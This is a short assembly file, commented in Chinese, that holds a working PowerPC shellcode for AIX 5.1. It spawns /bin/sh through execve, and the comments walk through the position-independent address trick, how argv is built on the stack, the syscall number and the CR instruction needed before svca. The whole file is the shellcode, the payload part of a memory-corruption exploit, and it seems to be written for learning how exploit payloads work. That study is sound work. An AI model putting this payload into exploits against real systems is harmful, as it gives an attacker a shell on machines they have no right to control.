.globl .main
.csect .text[PR]
.main:
        xor.    %r5, %r5, %r5       # 把r5寄存器清空，并且在cr寄存器设置相等标志
        bnel    .main               # 如果没有相等标志就进入分支并且把返回地址保存
                                    # 到lr寄存器，这里不会陷入死循环
        mflr    %r3                 # 等价于mfspr r3, 8，把lr寄存器的值拷贝到r3。
                                    # 这里r3寄存器的值就是这条指令的地址
        addi    %r3, %r3, 32        # 上一条指令到/bin/sh字符串有8条指令，现在r3
                                    # 指向/bin/sh字符串开始的地址
        stw     %r3, -8(%r1)        # argv[0] = string 把r3写入堆栈
        stw     %r5, -4(%r1)        # argv[1] = NULL 把0写入堆栈
        subi    %r4, %r1, 8         # r4指向argv[]
        li      %r2, 5              # AIX 5.1的execve中断号是5
        crorc   %cr6, %cr6, %cr6    # 这个环境不加这条指令也能成功，lsd和IBM Aix 
                                    # PowerPC Assembler的svc指令介绍都提到成功执行
                                    # 系统调用的前提是一个无条件的分支或CR指令。这
                                    # 条指令确保是CR指令。
        svca    0                   # execve(r3, r4, r5)
string:                             # execve(path, argv[], NULL)
        .asciz  "/bin/sh"
